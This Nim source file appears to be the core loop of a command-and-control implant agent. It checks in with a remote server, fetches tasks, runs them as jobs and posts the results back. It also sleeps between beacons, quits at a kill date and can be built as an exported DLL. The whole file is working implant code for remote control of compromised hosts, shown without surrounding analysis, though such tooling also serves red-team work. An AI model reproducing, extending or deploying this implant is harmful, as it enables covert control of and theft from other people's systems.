import algorithm
import asyncdispatch
import base64
import json
import re
from strutils import split
import ../utils/http
import ../utils/checkin
import ../utils/config
import ../utils/job
import ../utils/task

var curConfig = createConfig()
var runningJobs: seq[Job]

proc error*(message: string, exception: ref Exception) =
    echo message
    echo exception.getStackTrace()

proc parseJString(s: string): string = 
    var matches: array[1, string]
    var matched = find(s, re(r"{(.+)}", flags={reDotAll}), matches)

    var combString = "{"

    if matched >= 0:
        combString = combString & matches[0]

    result = combString & "}"

proc getTasks* : Future[seq[Task]] {.async.} = 
    var tasks: seq[Task]
    let taskJson = %*{"action" : "get_tasking", "tasking_size": -1 }
    when not defined(release):
        echo "Attempting to get tasks"
    let data = when defined(CRYPTO): $(taskJson) else: encode(curConfig.PayloadUUID & $(taskJson), true) 
    when not defined(release):
        echo "attempting to get tasks with this data: ", data
    let temp = when defined(CRYPTO): await Fetch(curConfig, data, true) else: decode(await Fetch(curConfig, data, true))
    when not defined(release):
        echo "decoded temp: ", temp
    if(cmp(temp[0 .. 35], curConfig.PayloadUUID) != 0):
        when not defined(release):
            echo "Payload UUID is not matching up when getting tasks something is wrong..."
        return tasks
    # https://nim-lang.org/docs/system.html#%5E.t%2Cint
    var sanitisedString = parseJString(temp)
    var resp = parseJson(sanitisedString)
    for jnode in getElems(resp["tasks"]):
        when not defined(release):
            echo "jnode: ", jnode
        tasks.add(Task(action: jnode["command"].getStr(), id: jnode["id"].getStr(), parameters: jnode["parameters"].getStr(), timestamp: jnode["timestamp"].getFloat()))
    # Sort by tasks' timestamps to get most recent tasks 
    tasks.sort(taskCmp)
    result = tasks
    when not defined(release):
        echo "Sorted result: ", $(result)


proc checkIn: Future[bool] {.async.} = 
    var check = createCheckIn(curConfig)
    when not defined(release):
        echo "Checkin has been created: ", $(check)

    let data = when defined(CRYPTO): checkintojson(check) else: encode(curConfig.PayloadUUID & checkintojson(check), true)
    try:
        # Send initial checkin and parse json response into JsonNode
        let temp = when defined(CRYPTO): await Fetch(curConfig, data, true) else: decode(await Fetch(curConfig, data, true))
        when not defined(release):
            echo "decoded temp: ", temp
        var sanitisedString = parseJString(temp)
        var resp = parseJson(sanitisedString)
        when not defined(release):
            echo "resp from checkin: ", resp
        if(cmp(resp["status"].getStr(), "success") == 0):
            curConfig.PayloadUUID = resp["id"].getStr()
            when not defined(release):
                echo "Updated curconfig payloaduuid ", curConfig.PayloadUUID, " to ", resp["id"].getStr()
            result = true
        else:
            result = false
    except:
        let
            e = getCurrentException()
            msg = getCurrentExceptionMsg()
        echo "Inside checkIn, got exception ", repr(e), " with message ", msg
        error("stacktrace", e)
        result = false

# Determine during compile time if being compiled as a DLL export main proc
when appType == "lib":
  {.pragma: rtl, exportc, dynlib, cdecl.}
else:
  {.pragma: rtl, }

proc main() {.async, rtl.} = 
    while (not await checkin()):
        let dwell = genSleepTime(curConfig)
        when not defined(release):
            echo "checkin is false"
            echo "dwell: ", dwell
        await sleepAsync(dwell)
    when not defined(release):
        echo "Checked in with curConfig of: ", $(curConfig)
    while true:
        if(checkDate(curConfig.KillDate)):
            quit(QuitSuccess)
        let tasks = await getTasks()
        when not defined(release):
            echo "tasks: ", $(tasks)
            echo "inside base and runningJobs: ", $(runningJobs)
        let resJobLauncherTup = await jobLauncher(runningJobs, tasks, curConfig)
        # Update config and obtain runnings jobs
        runningJobs = resJobLauncherTup.jobs
        curConfig = resJobLauncherTup.newConfig

        when not defined(release):
            echo "running jobs from joblauncher: ", $(runningJobs)
        let postResptuple =  await postUp(curConfig, runningJobs)
        when not defined(release):
            echo "jobs returned from postUp: ", $(postResptuple.resSeq)

        runningJobs = postResptuple.resSeq
        when not defined(release):
            echo "runningJobs after setting it equal to postresptuple.resSeq: ", $(runningJobs)
            echo "postResp: ", postResptuple.postupResp
            
        let dwell = genSleepTime(curConfig)
        await sleepAsync(dwell)

when appType != "lib":
    waitFor main()
